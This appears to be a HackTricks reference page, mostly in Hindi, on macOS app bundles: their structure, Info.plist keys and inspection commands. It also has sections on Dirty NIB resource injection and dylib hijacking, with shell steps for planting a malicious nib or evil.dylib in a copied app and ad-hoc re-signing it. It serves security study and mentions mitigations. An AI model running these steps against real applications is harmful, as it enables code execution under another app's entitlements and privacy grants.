# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

macOS में Bundles विभिन्न resources के containers के रूप में काम करते हैं, जिनमें applications, libraries और अन्य आवश्यक files शामिल होती हैं। इससे Finder में वे single objects के रूप में दिखाई देते हैं, जैसे परिचित `*.app` files। सबसे सामान्य bundle `.app` bundle है, हालांकि `.framework`, `.systemextension` और `.kext` जैसे अन्य प्रकार भी आम हैं।

### Essential Components of a Bundle

किसी bundle के अंदर, विशेष रूप से `<application>.app/Contents/` directory में, कई महत्वपूर्ण resources मौजूद होते हैं:

- **\_CodeSignature**: यह directory application की integrity verify करने के लिए आवश्यक code-signing details store करती है। आप निम्न commands जैसे commands का उपयोग करके code-signing information inspect कर सकते हैं:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: इसमें application की executable binary होती है, जो user interaction पर चलती है।
- **Resources**: application के user interface components के लिए repository, जिसमें images, documents और interface descriptions (nib/xib files) शामिल होते हैं।
- **Info.plist**: application की मुख्य configuration file के रूप में कार्य करती है, जो system को application को उचित रूप से पहचानने और उसके साथ interact करने के लिए आवश्यक होती है।

#### Info.plist में महत्वपूर्ण Keys

`Info.plist` file application configuration का आधार है, जिसमें निम्नलिखित keys शामिल होती हैं:

- **CFBundleExecutable**: `Contents/MacOS` directory में स्थित मुख्य executable file का नाम निर्दिष्ट करता है।
- **CFBundleIdentifier**: application के लिए एक global identifier प्रदान करता है, जिसका macOS application management के लिए व्यापक रूप से उपयोग करता है।
- **LSMinimumSystemVersion**: application को चलाने के लिए आवश्यक macOS का न्यूनतम version बताता है।

### Bundles की जांच

`Safari.app` जैसे bundle के contents की जांच करने के लिए निम्नलिखित command का उपयोग किया जा सकता है: `bash ls -lR /Applications/Safari.app/Contents`

यह जांच `_CodeSignature`, `MacOS`, `Resources` जैसी directories और `Info.plist` जैसी files को दिखाती है। इनमें से प्रत्येक application को secure करने से लेकर उसके user interface और operational parameters को define करने तक एक विशिष्ट उद्देश्य पूरा करती है।

#### Additional Bundle Directories

सामान्य directories के अलावा, bundles में निम्नलिखित भी शामिल हो सकते हैं:

- **Frameworks**: application द्वारा उपयोग किए जाने वाले bundled frameworks रखता है। Frameworks अतिरिक्त resources वाली dylibs की तरह होते हैं।
- **PlugIns**: plug-ins और extensions के लिए directory, जो application की capabilities को बढ़ाते हैं।
- **XPCServices**: application द्वारा out-of-process communication के लिए उपयोग की जाने वाली XPC services रखता है।

यह structure सुनिश्चित करता है कि सभी आवश्यक components bundle के भीतर encapsulated हों, जिससे modular और secure application environment उपलब्ध होता है।

`Info.plist` keys और उनके meanings के बारे में अधिक विस्तृत जानकारी के लिए, Apple developer documentation में व्यापक resources उपलब्ध हैं: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes और Abuse Vectors

- **Gatekeeper / App Translocation**: जब quarantined bundle को पहली बार execute किया जाता है, macOS deep signature verification करता है और इसे randomized translocated path से चला सकता है। स्वीकार किए जाने के बाद, बाद के launches में केवल shallow checks किए जाते हैं; `Resources/`, `PlugIns/`, nibs आदि में मौजूद resource files की ऐतिहासिक रूप से जांच नहीं की जाती थी। macOS 13 Ventura के बाद पहली run पर deep check लागू किया जाता है और नया *App Management* TCC permission third-party processes को user consent के बिना अन्य bundles को modify करने से प्रतिबंधित करता है, लेकिन पुराने systems अभी भी vulnerable हैं।
- **Bundle Identifier collisions**: एक ही `CFBundleIdentifier` का पुनः उपयोग करने वाले कई embedded targets (PlugIns, helper tools) signature validation को बाधित कर सकते हैं और कभी-कभी URL-scheme hijacking/confusion को सक्षम कर सकते हैं। हमेशा sub-bundles की सूची बनाएं और unique IDs verify करें।

## Resource Hijacking (Dirty NIB / NIB Injection)

Ventura से पहले, signed app में UI resources को बदलने से shallow code signing को bypass किया जा सकता था और app के entitlements के साथ code execution प्राप्त किया जा सकता था। Current research (2024) से पता चलता है कि यह pre-Ventura और un-quarantined builds पर अभी भी काम करता है:<sup>[[1]](#references)[[2]](#references)</sup>

1. Target app को writable location (जैसे `/tmp/Victim.app`) पर copy करें।
2. `Contents/Resources/MainMenu.nib` (या `NSMainNibFile` में declared किसी भी nib) को ऐसे malicious nib से replace करें जो `NSAppleScript`, `NSTask` आदि को instantiate करता हो।
3. App launch करें। Malicious nib victim के bundle ID और entitlements (TCC grants, microphone/camera आदि) के अंतर्गत execute होता है।
4. Ventura+ पहली launch पर bundle को deep-verify करके और बाद के modifications के लिए *App Management* permission आवश्यक बनाकर mitigation करता है। इसलिए persistence कठिन है, लेकिन पुराने macOS पर initial-launch attacks अभी भी लागू होते हैं।<sup>[[1]](#references)</sup>

Minimal malicious nib payload example (`ibtool` से xib को nib में compile करें):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking inside Bundles

क्योंकि `@rpath` lookups bundled Frameworks/PlugIns को प्राथमिकता देते हैं, इसलिए `Contents/Frameworks/` या `Contents/PlugIns/` के अंदर malicious library रखने से load order redirect किया जा सकता है, जब main binary library validation के बिना या कमजोर `LC_RPATH` ordering के साथ signed हो।

किसी unsigned/ad-hoc bundle का abuse करते समय सामान्य steps:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
- `com.apple.security.cs.disable-library-validation` के अभाव वाला Hardened runtime third-party dylibs को block करता है; पहले entitlements चेक करें।
- `Contents/XPCServices/` के अंतर्गत XPC services अक्सर sibling frameworks लोड करती हैं—persistence या privilege escalation paths के लिए उनके binaries को भी इसी तरह patch करें।

## त्वरित Inspection Cheatsheet
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## संदर्भ

- [1] [Bringing process injection into view(s): nib files का उपयोग करके macOS apps का exploitation (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB और bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
